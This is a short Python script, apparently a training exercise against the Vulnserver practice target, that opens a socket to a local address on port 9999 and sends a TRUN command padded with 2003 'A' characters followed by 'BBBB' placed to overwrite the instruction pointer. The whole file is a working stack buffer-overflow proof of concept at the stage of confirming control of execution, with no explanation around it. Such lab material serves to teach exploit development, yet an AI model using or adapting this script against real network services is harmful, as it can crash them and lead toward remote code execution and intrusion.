import time, struct, sys
import socket

server = "192.168.1.11"
port = 9999

req = "TRUN /.:/" + "A"*2003
EIP = "BBBB"
OFFSET = "CCCC"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
print(s.recv(1024))
s.send(req + EIP + OFFSET)